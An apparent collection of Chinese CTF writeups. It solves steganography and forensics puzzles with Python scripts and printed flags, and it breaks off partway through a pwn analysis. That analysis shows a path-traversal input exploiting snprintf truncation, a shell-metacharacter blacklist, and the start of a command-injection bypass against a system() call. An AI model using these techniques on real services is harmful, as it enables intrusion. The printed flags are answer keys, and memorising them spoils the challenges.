**4376**。\n\n将分离的图片格式转换成bmp，用相同的偏移量去看分离的图片就能找到分离图片异常的RGB值。\n\n打开windows画图工具，将 **00003754.png** 导入并保存至bmp格式\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/0dBGwozyumJ6C7yM1710404982.png)\n\n保存成功后，我们再用winhex分析该bmp文件。\n\n利用转到指定偏移量功能，输入 **4376**。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/molia4m3cH2E2vW61710404983.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/AE4gd1VGM5FaaNiT1710404983.png)\n\n通过观察能发现图片的RGB每个R通道都隐藏着00/01，这很大可能就是二进制数据的隐藏，所以现在需要将这部分区域的R通道数据提取出来，再将二进制转换成字符串。\n\n这里可以利用stegsolve自带的通道提取功能来做：\n\n将Red通道设置为0，然后Preview 在尾部找到FLAG 不太好找\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/hhJdpBVRBS5oMSDO1710404983.png)\n\n或者利用脚本进行处理。\n\n##### 脚本\n\n```python\n\"\"\"\n获取bmp图片异常处的偏移\n\"\"\"\noffset_bmp = open('solved.bmp','rb').read()\nheaderLength = 40\nmin = ''\nfor i in range(headerLength,len(offset_bmp)):\n    try:\n        data = offset_bmp[headerLength+i]\n        if data != 0:\n            if min == '':\n                min = headerLength + i\n            max = headerLength + i\n    except:\n        break\n\n\"\"\"\n根据偏移获取对应图片的数据，然后取R通道的第一位\n\"\"\"\nhidden_img = open('00003754.bmp','rb').read()\ndata = hidden_img[min:max+1]\nbinary = \"\"\n\n\"\"\"\n取二进制，每8位进行转换字符\n\"\"\"\nfor i in range(0,len(data),3):\n    binary += str(data[i])\n    if len(binary) % 8 == 0:\n        print(chr(int(binary,2)),end='')\n        binary = \"\"\n```\n\n脚本首先读取 **solved.bmp** 获取其异常数据的起始地址和结尾地址 这部是为了获取偏移量。\n\n第二步，读取分离图片的bmp形式 **final-end.bmp** 文件，将偏移量代入，获取那一部分的数据。\n\n最后将这部分数据 **每3步长读取第一个字节** 获取R通道的00/01数据，当二进制长为8时则使用将其转换成十进制，再用chr函数转换为字符串，最后打印得到结果。\n\n运行脚本得到FLAG：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/GJrPF3sBIYa8ozuV1710404983.png)\n\n##### FLAG1: E4sY_StEg4n0gR4pHy\n\n#### 2.找出文件夹2中的文件，将文件中的隐藏信息作为flag值提交；(见2023年江苏省Misc2)\n\n#### 3.找出文件夹3中的文件，将文件中的隐藏信息作为flag值提交；(见2023年江苏省Misc3)\n\n#### 4.找出文件夹4中的文件，将文件中的隐藏信息作为flag值提交；(见2023年江苏省Misc5)\n\n#### *5.找出文件夹5中的文件，将文件中的隐藏信息作为flag值提交。\n\n##### 分析\n\n（P10 使用十六进制分析工具对CTF中的图像隐写进行处理 原题）\n\n得到一个加密压缩包，\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/sGutQaOuStEEmOr51710404983.png)\n\n这题原题中提供了一个hint文件 **hint-1(admin.zip).txt** 但这题没有，提示是一段base64密文，解密就是压缩包的密码。\n\n没给提示就需要进行爆破文件，这里压缩包没有伪加密。密码是经典的**2.txt**中的一个密码，使用ARCHPR工具进行爆破。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DXjtOdAm1BI2LyGK1710404984.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2OoCWO7ODY3g0GpU1710404984.png)\n\n运行得到密码为 **aaacc2**\n\n解压压缩包，得到admin.exe，先用winhex分析\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kNW8hrtzFlEwnAsm1710404984.png)\n\n发现并不是exe文件的内容，而是base64图片的数据。\n\n将文件后缀改为.html，并添加标签\n\n```html\n<img src=\"data:image/png;base64,imtest\"/>\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2JbjrFTVuLUnvJAG1710404984.png)\n\n保存后打开html文件。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/C5E0xw0BiLA1WhG11710404984.png)\n\n得到了一个二维码，使用 **QR Research** 工具扫描得到FLAG\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lxHYrshYwSaZOdv71710404985.png)\n\n##### FLAG5: wizc_5438sdh8_k\n\n\n\n### CTF-Misc（2022江苏）\n\n#### Misc1\n\n##### 分析\n\n得到一张图片文件：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ukXMsCo9eqv7hNc01710404985.png)\n\n右键属性，在版权处发现了base64字符串：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Pw7HuLWbbZffh4fd1710404985.png)\n\n解密得到了flag的一部分：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ZcebGvMItdcKZpR61710404985.png)\n\n使用winhex工具分析图片文件，在文件头不远处发现了另一段base64字符串（这里为什么能写字符串而不会导致文件出错呢？因为jpg的这段数据块是存储着图片的信息，比如版权、版本号等。可以用exiftools来分析图片同样能得到该字符串）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/VdT6j7ctTlnUnPx11710404985.png)\n\n解密得到另一半的flag：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/g48OyfmdgIDtHyYN1710404986.png)\n\n拼接得到最终flag\n\n##### FLAG\n\n```\nXMAN{U5e_3x1ftoo1}\n```\n\n\n\n#### Misc2\n\n##### 分析\n\n得到图片文件：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/AXv6Vl7WXzgZ1kv51710404986.png)\n\nwinhex工具分析，拉到文件头发现了额外数据。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/TsrpgQr1acb1EPM21710404986.png)\n\n很明显是png头反过来了，也就是隐藏了一个png图片 其内容是颠倒的。\n\n用python一句话来处理下即可：\n\n##### 解密脚本\n\n```python\nopen('flag.png','wb').write(open('flag2.jpg','rb').read()[::-1])\n```\n\n运行得到flag.png图片，打开得到flag\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/RNauqKXpAZRurrlU1710404986.png)\n\n##### FLAG\n\n```\nflag{Mirr0r_R3f3ct1on_H1dd3n_f14g}\n```\n\n\n\n#### Misc3\n\n##### 分析\n\n得到一个gif文件：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/o6J5P4jLle5dAn791710404986.png)\n\n每一帧都会变动，猜测是将图片分割成许多帧，再一帧帧播放。\n\n使用PIL模块的seek(t)函数可以获取第t帧的内容，最后再拼接即可：\n\n##### 解密脚本\n\n```python\nfrom PIL import Image\n\nimg = Image.open('flag3.gif')\nflag = Image.new('RGB',(400,600))\nt = 0\nwhile 1:\n    try:\n        img.seek(t) # 提取帧\n        flag.paste(img,(t*2,0)) #将第t帧的图片贴至大图的(t*2,0)处\n        t += 1\n    except Exception as e:\n        break #无法提取时结束循环\n\nflag.show() # 获取大图\nflag.save('flag.png')\n```\n\n运行得到flag.png即还原后的大图：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/x1JkoEuQ9HpGJ6Mx1710404987.png)\n\n##### FLAG\n\n```\nTWCTF{Bliss by Charles O'Rear}\n```\n\n#### Misc4\n\n##### 分析\n\n打开文件夹，得到了一堆黑白块图片：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/SvJRfydPG5cBJDvp1710404987.png)\n\n看到这些要想到01二进制，黑色代表1白色代表0。\n\n使用PIL模块读取图片的RGB值，根据RGB的颜色来加二进制字符串到空值中，最后将得到的完整二进制字符串转换成16进制 再转换成文字就是最终的内容。\n\n##### 解密脚本\n\n```python\nfrom PIL import Image\nimport binascii\n\nf = ''\nfor i in range(104):\n    img = Image.open(f'{i}.jpg')\n    c = img.getpixel((5,5))\n    if c == (255,255,255):\n        f += \"0\"\n    else:\n        f += '1'\n        \nprint(f)\nprint(binascii.unhexlify(str(hex(int(f,2)))[2:]))\n```\n\n运行得到二进制字符串：\n\n```\n01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101\n```\n\n将其转换成10进制，再转换成16进制，最后用```binascii.unhexlify ```转换成字符串。\n\n```\nf -> int(f,2) -> hex(int(f,2)) -> binascii.unhexlify(str(hex(int(f,2)))[2:]) # 2 -> 10 -> 16 -> string\n```\n\n##### FLAG\n\n```\nflag{FuN_giF}\n```\n\n#### Misc5\n\n##### 分析\n\n得到gif文件，其文件已损坏：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/8sgf7YthXOFLWSNL1710404987.png)\n\nwinhex打开文件分析，发现文件头错误:\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/MTNFOcYYGvz7hicB1710404987.png)\n\n将前6位修改为**GIF89a**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/OiueizAvuM0AxSH01710404988.png)\n\n此时能正确打开gif文件了。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/N086VpoWF3LfoNKN1710404988.gif)\n\n通过一阵分析，发现每一帧都没有隐藏什么文件，颜色通道也没有异常。\n\n由于是gif文件，所以每一帧之间的间隔时间也需要注意，这里的隐写就是用间隔时间来信息隐藏，这种隐写方式不易被观察，需要猜测与尝试。\n\n##### identify提取帧\n\n使用linux下工具**identify**的%T参数 可以提取gif文件每帧的间隔时间\n\n```\nidentify -format \"%T\\n\" flag5.gif > log.txt\n```\n\n运行后查看log.txt，能发现结果中存在多个20和10字符串。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DJEec1iI8uFaOTOI1710404988.png)\n\n看到20和10这种只有两个东西在一直变换的，就要想到01二进制。\n\n用脚本处理下：\n\n```python\nf = open('log.txt','r')\nc = ''\nfor i in f.readlines():\n    if i.strip() == \"20\":\n        c+=\"0\"\n    elif i.strip() == \"10\":\n        c+=\"1\"\nprint(int(c,2))\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/uTHHuCD5fuQ0FUJX1710404989.png)\n\n```\n11242118628080835792247744382995610024487930109872337843748298905408419611821515107458037117\n```\n\n运行后得到转换二进制的十进制数字，与第四道题不同，这里不需要转换成16进制再转换文字。\n\n仔细观察这堆十进制数字：**113、42、118** 不难发现都是ascii码的范围(32-127)的数字，所以这些数字可以直接转换成对应的字符。\n\n具体怎么转换呢？二进制转换文字**一种就是转换成16进制，再转换成文字**；**另一种就是取每8位的二进制字符串来转换十进制，再根据十进制ascii码转换成文字**。\n\n##### 小总结\n\n当我们遇到二进制字符串时，要根据特征来不断地尝试和猜测，它可以是16进制转换，也可以是10进制的ascii码转换。\n\n同时遇到可能是可以转换二进制字符串的加密密文要想到二进制\n\n##### 解密脚本\n\n这里是取每8位来转换，优化下脚本\n\n```python\nimport os\nos.system('identify -format \"%T\\n\" flag5.gif > log.txt')\nf = open('log.txt','r')\nc = ''\nfor i in f.readlines():\n    if i.strip() == \"20\":\n        c+=\"0\"\n    elif i.strip() == \"10\":\n        c+=\"1\"\nprint(int(c,2))\nfor i in range(0,len(c),8):\n    data = int(c[i:i+8],2)\n    print(chr(data),end='')\n```\n\n运行得到FLAG\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/8OGDonWQ4ocGt7ym1710404989.png)\n\n##### FLAG\n\n```\nXMAN{96575beed4dea18ded4735643aecfa35}\n```\n\n\n\n\n\n### CTF-Crypto（2022江苏）\n\n***crypto基本都是杂项题，可以说跟密码学一点关系都没有。**\n\n\n\n#### Crypto1\n\n##### 分析\n\n下载得到caigou.pdf\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jpU6Djd9nMKKjrCG1710404989.png)\n\n打开文件，字符串隐藏在图片后面，直接ctrl+A全选复制得到flag\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/WJroz2LzLye8nB9G1710404989.png)\n\n##### FLAG\n\n```\nflag{security_through_obscurity}\n```\n\n#### Crypto2\n\n##### 分析\n\n得到压缩包文件\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/c77bpNUU8sUA2EDE1710404989.png)\n\n解压得到一个data文件![](http://cdn.anyiblog.top/WriteUp/20240314/61CtcnoymC2KQq5g1710404990.png)\n\n直接foremost分离，看看存在哪些文件\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2OFWbqTU7Rqdf6fv1710404990.png)\n\n得到一张图片文件，内容就是flag：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Fq1DfDllJK1Ssl3S1710404990.jpg)\n\n##### FLAG\n\n```\nflag{f0rens!cs!sC00L}\n```\n\n#### Crypto3\n\n##### 分析\n\n得到压缩包文件，解压得到ada.jpg\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/69lIc1xHUU88XdtY1710404990.png)\n\nforemost分离图片文件，得到了一个压缩包，里面是flag.txt但需要密码。![](http://cdn.anyiblog.top/WriteUp/20240314/rWL0ksxkGHgYcGMn1710404990.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/E16ZW1WL6kxDlbaq1710404990.png)\n\n密码从图片入手，还是分析图片。\n\n##### 获取压缩包密码\n\n在图片信息中的照相机型号找到一串16进制数据\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/I3H3iL6ieDwuIjHD1710404991.png)\n\n或者是winhex分析找到这段hex\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/e6C0j8J97b2bEdhZ1710404991.png)\n\n将字符串16进制解密，得到了key 也就是压缩包密码：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/iHOGEltLR0pJmDnx1710404991.png)\n\n```\nsdnisc_2018\n```\n\n使用密码解密压缩包得到FLAG：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lZrsnApAsiSMc5a31710404991.png)\n\n##### FLAG\n\n```\nflag{3XiF_iNf0rM@ti0n}\n```\n\n#### Crypto4\n\n##### 分析\n\n**此题与江苏-misc2相同**\n\n得到图片文件：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/6ndGR4TTpX64ICga1710404992.png)\n\nwinhex工具分析，拉到文件头发现了额外数据。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/HclbNx58I161rWvg1710404992.png)\n\n很明显是png头反过来了，也就是隐藏了一个png图片 其内容是颠倒的。\n\n用python一句话来处理下即可：\n\n##### 解密脚本\n\n```python\nopen('flag.png','wb').write(open('flag2.jpg','rb').read()[::-1])\n```\n\n运行得到flag.png图片，打开得到flag\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/xutf2tG1GdLx7zwv1710404992.png)\n\n##### FLAG\n\n```\nflag{Mirr0r_R3f3ct1on_H1dd3n_f14g}\n```\n\n#### Crypto5\n\n##### 分析\n\n得到一张jpg图片\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/45CIr5qPV2DM9PE91710404992.png)\n\n用foremost分离得到另一张图片\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/OyymLUM7EDXooDob1710404992.png)\n\n得到图片 查看内容得到FLAG：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/hA6RA4uuCprSTHkf1710404992.jpg)\n\n##### FLAG\n\n```\nfalg{NSCTF_e6532a34928a3d1dadd0b049d5a3cc57}\n# 这里flag可能打错了，可能是flag{NSCTF_e6532a34928a3d1dadd0b049d5a3cc57}，比赛的时候提交多尝试几次就行。\n```\n\n\n\n","tags":["刷题"],"categories":["刷题笔记","中职"]},{"title":"第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up","url":"/2023/12/09/20231209/","content":"# 前言\n\n这次是代表SU参加强网杯国际赛，属于是我第一次参加这种大型赛事，这种模式的体验机会确实少，长见识了！\n\n给大家贴几张图片感受一下：\n\n![](http://cdn.anyiblog.top/WriteUp/20231209/AYffxbT6S5qKrM9F1702093191.png)\n![](http://cdn.anyiblog.top/WriteUp/20231209/NikhjPQB5KwZ9D0w1702093192.png)\n![](http://cdn.anyiblog.top/WriteUp/20231209/kQI8L3kNPahQl1MD1702093192.png)\n![](http://cdn.anyiblog.top/WriteUp/20231209/RERmtUu6LKtmKgHe1702093193.png)\n\n和常规的CTF大赛不同的是，分了互联网赛道、车联网赛道和人工智能赛道，CTF只能算是互联网赛道的”门槛资格赛“，可以看出整体更偏向对固件、设备、模型的攻击，所以难度也很高！（直接被打烂了，日不了一点车）\n\n因为只把CTF资格赛的杂项AK了，所以贴下题解。\n\n## **Misc1.Git gud**\n\n下载附件得到一张图片attachment.png\n\n![](http://cdn.anyiblog.top/WriteUp/20231209/xsoTSB7ysGd565lR1702093193.png)\n\n图片上半部分有黑点+透明，大概率是提取alpha透明度。\n\n用zsteg也能分析出来，有一段“VegetableThenManyPractice”的密文\n\n![](http://cdn.anyiblog.top/WriteUp/20231209/SUg8PAH8QI8GbM4I1702093193.png)\n\n搓个脚本提取：\n\n```\nfrom PIL import Image\n  \n  \nimg = Image.open('attachment.png')\n  \n  \nwidth,height = img.size\n#width,height = 284,77\n  \n  \nprint(width,height)\n  \n  \nflag = \"\"\nfor y in range(0,height):\n    for x in range(0,width):\n  \n  \n        rgb = img.getpixel((x,y))\n  \n  \n        alpha = chr(rgb[3])\n  \n  \n        if alpha != 255:\n  \n  \n            flag += alpha\n        else:\n            pass\n  \n  \nprint(flag)\n```\n\n刚开始是没有想到alpha透明度的，以为和01二进制有关，然后发现把getpixel的RGB打印出来是4位RGBA类型的，且透明度的数值基本都能转换ascii，所以将其提取。\n\n![](http://cdn.anyiblog.top/WriteUp/20231209/MS6UyGNfxH1ivCKj1702093194.png)\n\n将密文保存到文本里，分析这段密文就可以了。\n![](http://cdn.anyiblog.top/WriteUp/20231209/U0tjAoU6U9DHkBn11702093194.png)\n这段密文重复Vegetable、Then、Many、Practice四个单词，一开始以为是词频分析，但是提取之后查看频率发现不是。\n\n那4个为一组的密文可能的就是**4进制**了\n\n分别替换这4个单词为0 1 2 3，然后将4进制转换成10进制，再转换为Hex，最后Hex转文字。\n\n脚本：\n\n```\nimport binascii\n  \n  \ncipher = \"VegetableThenManyPracticeThenManyThenManyThenManyPracticeVegetableThenManyVegetableThenThenManyThenPracticeThenPracticeManyPracticeThenManyVegetableThenVegetablePracticeThenPracticeVegetablePracticeThenManyVegetablePracticeVegetableVegetableThenManyThenManyVegetablePracticeVegetablePracticeVegetablePracticeVegetableManyVegetablePracticeVegetableThenVegetablePracticeThenPracticeVegetablePracticeThenVegetableVegetablePracticeVegetableVegetableVegetablePracticeThenManyVegetablePracticeThenThenVegetablePracticeManyThenThenManyThenVegetableVegetablePracticeThenVegetableThenManyVegetablePracticeVegetablePracticeManyVegetableVegetablePracticeVegetableThenThenManyThenVegetableVegetablePracticeThenVegetableThenManyVegetableThenVegetablePracticeThenVegetableThenManyVegetableManyVegetablePracticeVegetableManyVegetablePracticeThenManyVegetablePracticeVegetableManyThenManyThenManyVegetablePracticeThenThenVegetablePracticeVegetableVegetableVegetablePracticeVegetableManyVegetablePracticeVegetableThenThenPracticePracticeThen\"\ncipher = cipher.replace('Vegetable','0').replace('Then','1').replace('Many','2').replace('Practice','3')\n  \n  \nbindata = int(cipher,4)\nprint(bindata)\n  \n  \nflag = binascii.unhexlify(hex(bindata)[2:])\nprint(flag)\n```\n\n运行脚本得到FLAG\n\n![](http://cdn.anyiblog.top/WriteUp/20231209/QtsNtL5g9scDMSBq1702093194.png)\n\nFLAG: flag{a760f321740659d4c81d4a4b262f5021}\n\n## **Misc2.cyberpic**\n\n下载附件得到文件flag.png 但是打不开\n![](http://cdn.anyiblog.top/WriteUp/20231209/FcUzRVnqV24zY3131702093194.png)\n\n直接Winhex分析\n\n![](http://cdn.anyiblog.top/WriteUp/20231209/Bef0WRKbX2u3SI4i1702093194.png)\n\n看到IEND一眼就可以分析出来文件字节是被反转了\n\n搓个脚本还原：\n\n```\ncontent = open('flag.png','rb').read() \nwith open('flag2.png','wb') as f: \n    f.write(content[::-1])\n```\n\n反转还原得到图片：\n\n![](http://cdn.anyiblog.top/WriteUp/20231209/bDGaCSEQMG2Xg8hV1702093195.png)\n\n这图片看着很怪有莫名其妙的白条，就和上一道题一样，肯定是某种加密，但是先用stegsolve分析看看有没有什么lsb隐写：\n\n调了最低位分析发现真的有一段密文：\n\n![](http://cdn.anyiblog.top/WriteUp/20231209/cSg5nARsCnO1IYJE1702093195.png)\n\n密文：P0TK3KmCts9MZ1iohH04mgZXPz30FSRlQEaK6drCbH68jX92ul0Giv/sRw9QbCBr\n\n这个密文就很像AES或者DES等对称密码，大概率是AES了，所以要找Key，这个时候Key大概率就是跟这个白条有关系了\n\n两道题其实很像，这道题也是提取01，只不过这道题脑洞有点大。之前尝试过提取频率发现不是确定就是提取01二进制。\n\n  \n\n脚本： （这里高度384是白条的部分，测试出来的高度）\n\n```\nfrom PIL import Image\n  \n  \nimg = Image.open('flag2.png')\n  \n  \nwidth = 5\nheight = 384\n  \n  \ndata = \"\"\n  \n  \nfor y in range(height):\n  \n  \n    rgb = img.getpixel((width,y))\n  \n  \n    if rgb == (255,255,255):\n  \n  \n        data += \"1\"\n  \n  \n    else:\n  \n  \n        data += \"0\"\n  \nprint(data)\nprint(len(data))\n  \n# 000000111111000000000111000000111111000000000111000000111111000111000000000000111111000111000111000000111111000000000111000000111111000111000000000000111111000000000111000000111111111000000111000000111111000000000111000000111111111000000111000000111111111000000000000000111111000000000111000000111111000000000000000111111000111000000000000111111000000111000111000111111000111111111000  \n# 384\n```\n\n\n拿到这段0和1如果直接转换那肯定是出不了的，所以这里就是脑洞大的部分。\n\n因为之前提取过白条和黑条出现的频率，通过频率分析能发现黑白条出现的数量都是3 6 9 12 15这种3的倍数\n\n```\nfrom PIL import Image\n  \n  \n  \n  \nimg = Image.open('flag2.png')\n  \n  \n  \n  \nwidth = 5\nheight = 384\n  \n  \n  \n  \ndata = \"\"\nls = []\n  \n  \nfor y in range(height):\n  \n  \n  \n  \n    rgb = img.getpixel((width,y))\n  \n  \n    if rgb == (255,255,255):\n  \n  \n  \n  \n        data += \"1\"\n        ls.append(1)\n  \n  \n  \n  \n    else:\n  \n  \n        ls.append(0)\n        data += \"0\"\n  \n  \nls2 = []\n  \n  \nstart = 0\nEnd = 0\nfor i in range(len(ls)):\n    try:\n        if ls[i] != ls[i+1]:\n  \n  \n            End += 1\n            ls2.append(len(ls[start:End]))\n            start = End\n  \n  \n        else:\n            End += 1\n    except:\n        pass\nprint(ls2)\n  \n  \n# [6, 6, 9, 3, 6, 6, 9, 3, 6, 6, 3, 3, 12, 6, 3, 3, 3, 3, 6, 6, 9, 3, 6, 6, 3, 3, 12, 6, 9, 3, 6, 9, 6, 3, 6, 6, 9, 3, 6, 9, 6, 3, 6, 9, 15, 6, 9, 3, 6, 6, 15, 6, 3, 3, 12, 6, 6, 3, 3, 3, 3, 6, 3, 9]  \n```\n\n所以猜想二进制是每3位取1个，最后转ascii。\n\n脚本提取：\n\n```\nfrom PIL import Image\n  \n  \nimg = Image.open('flag2.png')\n  \n  \nwidth = 5\nheight = 384 #384是图片有白条的高度部分\n  \n  \ndata = \"\"\n  \n  \nfor y in range(height):\n  \n  \n    rgb = img.getpixel((width,y))\n    #取白条为1，其余为0\n    if rgb == (255,255,255):\n  \n  \n        data += \"1\"\n  \n  \n    else:\n  \n  \n        data += \"0\"\n  \n  \nbindata = \"\"\n  \n  \nfor i in range(0,len(data),3):\n  \n  \n    bindata += data[i]\n  \n  \nfor i in range(0,len(bindata),8):\n  \n  \n    print(chr(int(bindata[i:i+8],2)),end='')\n  \n# 1145141919810hen  \n  \n```\n\n运行得到Key：**1145141919810hen**\n注意刚开始我这里高度写的是381，得到的key是1145141919810he7，后面发现解不出来不对，所以高度多加上3 得到了这个最终Key。\n\n最后用Key解AES密文就可以得到FLAG了 模式选择AES\n\n![](http://cdn.anyiblog.top/WriteUp/20231209/rJeWvtGuiMTow5bL1702093195.png)\n\nFLAG: flag{9103d33366cc1193c81f55a06e34c5d2}","tags":["CTF"],"categories":["刷题笔记","Writeup"]},{"title":"DASCTF二进制专项赛Writeup | cap&server","url":"/2023/06/05/20230605/","content":"\n# 前言\n\n上个周末也是参加了buu的DASCTF的二进制专项赛，只有Pwn和Reverse，做了一天题也就做出来两道hhh题目很难，实属二进制坐牢专项赛。\n\n和余师傅组的队最终是做出来四道题目，排名21 成绩还可以。\n\n![](http://cdn.anyiblog.top//common/@S34~%7DS7Y%60OF%602X%60UNVLCP5.png)\n\n我出的分别是逆向的cap和Pwn的Server，做的过程不易故此记录一下。\n\n\n\n# [Pwn]server\n\n这道题相比Pwn更像是web的命令执行过滤绕过题。\n\n## 分析\n\n64位程序，PIE保护。IDA打开分析：\n\n![](http://cdn.anyiblog.top//common/20230605091031.png)\n\nmain函数是检测用户输入，功能1是验证身份，功能2是添加用户，只有当功能1验证身份成功时才能使用功能2，所以这边我们先跟进功能1查看：\n\n### 功能1\n\n![](http://cdn.anyiblog.top//common/image-20230605091240444.png)\n\n```c\nunsigned __int64 sub_141A()\n{\n  char s[32]; // [rsp+0h] [rbp-60h] BYREF\n  char name[56]; // [rsp+20h] [rbp-40h] BYREF\n  unsigned __int64 v3; // [rsp+58h] [rbp-8h]\n\n  v3 = __readfsqword(0x28u);\n  puts(\"Hello, CTFer.\");\n  puts(\"Please input the key of admin : \");\n  fgets(s, 28, stdin);\n  snprintf(name, 0x20uLL, \"/keys/%s.key\", s);\n  if ( access(name, 0) == -1 )\n  {\n    puts(\"Sorry, you are not winmt.\");\n  }\n  else\n  {\n    puts(\"Hello, winmt.\");\n    dword_404C = 1;\n  }\n  return __readfsqword(0x28u) ^ v3;\n}\n```\n\n\n\n这里的 `snprintf` 是赋值的作用，将得到的字符串s带入`/keys/%s.key` 最后赋值给 `name` 变量\n\n`access`的作用是判断一个文件或文件夹是否存在。\n\n所以大致功能就是将用户输入的字符串带入到 `/keys/%s.key` 中，然后检测这个文件是否存在。\n\n\n\n漏洞就出现在s长度和name长度不一致导致的**变量覆盖**。这里s数组长度是28，name数组长度为32(0x20)，s加上`/keys/.key`字符总共有 10+28=38的长度，明显大于name长度。\n\n利用这一点，我们可以将name变量尾部的.key给覆盖掉，同时利用 ../实现目录穿越给到一个存在的文件或文件夹。\n\n\n\n**注意这里构造payload时只能有./，不能构造其它的字符串。**比如/keys/aaaa/../../这种，由于aaaa目录不存在所以会导致access返回结果为false。其实和cd类似，测试的时候可以直接用cd测试一个路径。\n\n还有构造的字符串要记得少一个，因为输入的时候换行符也占一个输入，否则就会绕不过去。\n\n\n\n```python\ncontent = \"../../../../../././keys\"\n\nkey = \"/keys/%s.key\"%content\n\nprint(key[:32])\n\nPS C:\\Users\\test> & D:/Python37/python.exe c:/Users/test/Desktop/try.py\n/keys/../../../../.././././keys.\nPS C:\\Users\\test>\n```\n\n\n\n![](http://cdn.anyiblog.top//common/20230605093330.png)\n\n可以看到成功绕过了第一层。\n\n### 功能2\n\n![](http://cdn.anyiblog.top//common/image-20230605094745230.png)\n\n```c\nunsigned __int64 sub_16B5()\n{\n  char v1[16]; // [rsp+10h] [rbp-50h] BYREF\n  char s[56]; // [rsp+20h] [rbp-40h] BYREF\n  unsigned __int64 v3; // [rsp+58h] [rbp-8h]\n\n  v3 = __readfsqword(0x28u);\n  puts(\"Hello, winmt.\");\n  puts(\"Please input the username to add : \");\n  if ( (unsigned int)sub_14DA(v1) == -1 )\n  {\n    puts(\"Woc! You're a hacker!\");\n    dword_404C = 0;\n    exit(-1);\n  }\n  snprintf(s, 0x30uLL, \"add_user -u '%s' -p '888888'\", v1);\n  system(s);\n  puts(\"Success!\");\n  return __readfsqword(0x28u) ^ v3;\n}\n```\n\n同样是输入字符串，将输入的字符串经过 `sub_14DA` 函数判断后，带入到 `add_user -u '%s' -p '888888'` 中，然后system执行。\n\n我们跟进 `sub_14DA` 函数分析：\n\n![](http://cdn.anyiblog.top//common/20230605094825.png)\n\n```c\n__int64 __fastcall sub_14DA(__int64 a1)\n{\n  __int64 result; // rax\n  int i; // [rsp+1Ch] [rbp-4h]\n\n  for ( i = 0; i <= 9; ++i )\n  {\n    read(0, (void *)(i + a1), 1uLL);\n    if ( *(_BYTE *)(i + a1) == 10 )\n      return 1LL;\n    if ( *(_BYTE *)(i + a1) == 59\n      || *(_BYTE *)(i + a1) == 96\n      || *(_BYTE *)(i + a1) == 38\n      || *(_BYTE *)(i + a1) == 124\n      || *(_BYTE *)(i + a1) == 36\n      || *(_BYTE *)(i + a1) == 40\n      || *(_BYTE *)(i + a1) == 32\n      || *(_BYTE *)(i + a1) == 41\n      || *(_BYTE *)(i + a1) == 123\n      || *(_BYTE *)(i + a1) == 125\n      || *(_BYTE *)(i + a1) == 45\n      || *(_BYTE *)(i + a1) == 47\n      || *(_BYTE *)(i + a1) == 92 )\n    {\n      *(_BYTE *)(i + a1) = 0;\n      return 0xFFFFFFFFLL;\n    }\n    if ( *(_BYTE *)(i + a1) != 115 )\n    {\n      result = *(unsigned __int8 *)(i + a1);\n      if ( (_BYTE)result != 104 )\n        continue;\n    }\n    *(_BYTE *)(i + a1) = 0;\n    return 0xFFFFFFFFLL;\n  }\n  return result;\n}\n```\n\n\n\n从该函数可以得知，for循环了10次 所以这里输入的字符串长度为10。\n\n同时会对输入的字符串每个字符进行判断，如果字符在程序里的ascii中就会返回false，是一个黑名单过滤，有以下字符：\n\n![](http://cdn.anyiblog.top//common/image-20230605095359857.png)\n\n\n\n所以大致思路就是通过输入的字符串绕过 `add_user -u '%s' -p '888888'`这一段话然后命令执行。\n\n这里单引号没有被过滤，所以输入的字符串可以绕过这个引号。\n\n这里测试绕过最好是gdb调试，这样更加直观：\n\n![](http://cdn.anyiblog.top//common/20230605095817.png)\n\n![](http://cdn.anyiblog.top//common/20230605095841.png)\n\n\n\n## 非预期&思路&Payload\n\n当时调到这里就懵逼了，咋还有个keys？然后发现就是功能1输入的部分，再仔细看代码发现和功能1用的是同一个变量：\n\n`snprintf(s, 0x30uLL, \"add_user -u '%s' -p '888888'\", v1);`\n\n这题算是非预期吧，做完问了下winmt师傅 